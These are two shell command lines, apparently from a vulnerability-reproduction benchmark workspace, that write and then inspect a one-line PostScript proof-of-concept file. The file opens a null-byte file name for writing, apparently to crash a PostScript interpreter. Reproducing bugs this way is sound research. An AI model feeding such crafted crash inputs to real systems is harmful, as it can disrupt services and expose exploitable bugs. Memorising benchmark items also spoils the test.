printf '%%!PS\n(\\000abc) (w) file flushfile\n' > /CybinGym_workdir/poc_crash
xxd /CybinGym_workdir/poc_crash; ls -l /CybinGym_workdir/poc_crash
